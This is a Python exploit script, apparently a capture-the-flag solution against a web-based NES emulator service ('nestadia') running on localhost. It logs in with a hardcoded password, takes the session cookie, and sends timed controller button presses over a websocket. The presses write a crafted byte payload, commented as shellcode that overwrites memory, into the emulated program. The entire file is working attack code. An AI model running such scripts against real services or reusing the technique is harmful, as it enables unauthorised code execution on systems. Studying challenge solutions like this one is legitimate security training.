import asyncio
import requests
import websockets

url = "localhost:8080"
delay = 0.03

actix_session = requests.post("http://" + url + "/api/login", json={"password":"nwTdWyK4uXmzU9HkVwEDVhhe3ENCgkfa"}).cookies['actix-session']

shellcode = b"\x00\x00\x80\x00"

payload = b"\x00\x00"  # The first one gets overwritten by 0xC0 and the second one is taken as an argument to cpy 
payload += shellcode
payload += b'\x00' * (0x100 - len(payload)) + b"\x02"
payload += b'\x00' * (0x1ff - len(payload))

print(hex(len(payload)))

async def nestadiaWs():
    async def consumer_handler(websocket):
        async for message in websocket:
            message

    async def producer_handler(websocket):
        for i in payload:
            for j in range(0, i):
                # Press and release A
                controller = 0x80
                await asyncio.sleep(delay)
                await websocket.send(bytes([controller]))
                controller = 0x00
                await asyncio.sleep(delay)
                await websocket.send(bytes([controller]))
            # Press and release B
            controller = 0x40
            await asyncio.sleep(delay)
            await websocket.send(bytes([controller]))
            controller = 0x00
            await asyncio.sleep(delay)
            await websocket.send(bytes([controller]))

        # Press and release Start
        controller = 0x10
        await asyncio.sleep(delay)
        await websocket.send(bytes([controller]))
        controller = 0x00
        await asyncio.sleep(delay)
        await websocket.send(bytes([controller]))

        await asyncio.sleep(10)

    async with websockets.connect("ws://" + url + "/api/dev/emulator", extra_headers=[('Cookie', 'actix-session=' + actix_session)]) as websocket:
        consumer_task = asyncio.ensure_future(consumer_handler(websocket))
        producer_task = asyncio.ensure_future(producer_handler(websocket))
        done, pending = await asyncio.wait([consumer_task, producer_task],return_when=asyncio.FIRST_COMPLETED,        )
        for task in pending:
            task.cancel()






asyncio.get_event_loop().run_until_complete(nestadiaWs())
